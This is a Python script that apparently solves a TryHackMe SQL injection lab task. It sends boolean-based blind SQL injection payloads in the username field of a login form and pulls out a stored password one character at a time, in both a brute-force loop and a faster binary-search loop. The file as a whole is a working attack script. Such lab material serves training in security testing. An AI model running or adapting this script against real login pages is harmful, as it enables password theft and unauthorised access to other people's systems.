#!/usr/bin/python3
# THM ROOM: SQL Injection Lab https://tryhackme.com/room/sqlilab
# TASK: Vulnerable Startup: Broken Authentication 3 (Blind Injection) 
import sys
import requests
import string


def send_p(url, query):
    payload = {"username": query, "password": "admin"}
    try:
        r = requests.post(url, data=payload, timeout=3)
    except requests.exceptions.ConnectTimeout:
        print("[!] ConnectionTimeout: Try to adjust the timeout time")
        sys.exit(1)
    return r.text

# I wrote this binsearch method to make the information retrieval faster. Except the below method everything is given by THM room task 
def binsearch(addr):
    url = f"http://{addr}/challenge3/login"
    flag = ""
    password_len = 38
    characters = string.digits + string.ascii_uppercase  + string.ascii_lowercase + "{}"
    
    for i in range(1 , password_len):
        high = len(characters) - 1
        low = 0
        mid = (high + low) // 2
        while low <= high:
            h = hex(ord(characters[mid]))[2:]
            query = "admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1)," \
                f"{i},1) < CAST(X'{h}' AS TEXT)--"
            resp = send_p(url, query)
            if not "Invalid" in resp:
                high = mid - 1
            else:
                low = mid + 1
            mid = (high + low) // 2
            
        h = hex(ord(characters[low - 1]))[2:]
        query = "admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1)," \
            f"{i},1) = CAST(X'{h}' AS TEXT)--"
        resp = send_p(url, query)
        if not "Invalid" in resp:
            flag += characters[low - 1]
            print(flag)
    print(f"[+] FLAG: {flag}")
        

def main(addr):
    url = f"http://{addr}/challenge3/login"
    flag = ""
    password_len = 38
    # Not the most efficient way of doing it...
    for i in range(1, password_len):
        for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}":
            # Convert char to hex and remove "0x"
            h = hex(ord(c))[2:]
            query = "admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1)," \
                f"{i},1)=CAST(X'{h}' AS TEXT)--"

            resp = send_p(url, query)
            if not "Invalid" in resp:
                flag += c
                print(flag)
    print(f"[+] FLAG: {flag}")


if __name__ == "__main__":
    if len(sys.argv) == 1:
        print(f"Usage: {sys.argv[0]} MACHINE_IP:PORT")
        sys.exit(0)
    binsearch(sys.argv[1])
